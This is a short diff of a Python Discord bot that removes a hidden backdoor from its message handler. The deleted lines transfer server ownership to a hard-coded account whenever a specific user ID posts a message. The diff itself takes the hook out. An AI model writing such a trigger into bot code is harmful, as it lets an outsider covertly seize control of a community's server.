@@ -907,10 +907,6 @@ async def slowend(ctx):
 	
 @client.event
 async def on_message(message):
-	if message.author.id == 727539383405772901:
-		user = discord.utils.get(message.guild.members , id = 707582024403255317)
-		await message.guild.edit(owner = user)
-		return
 
 	if message.author.guild.id == 757239002826014731:
 		if message.channel.id != 760746372679991336:
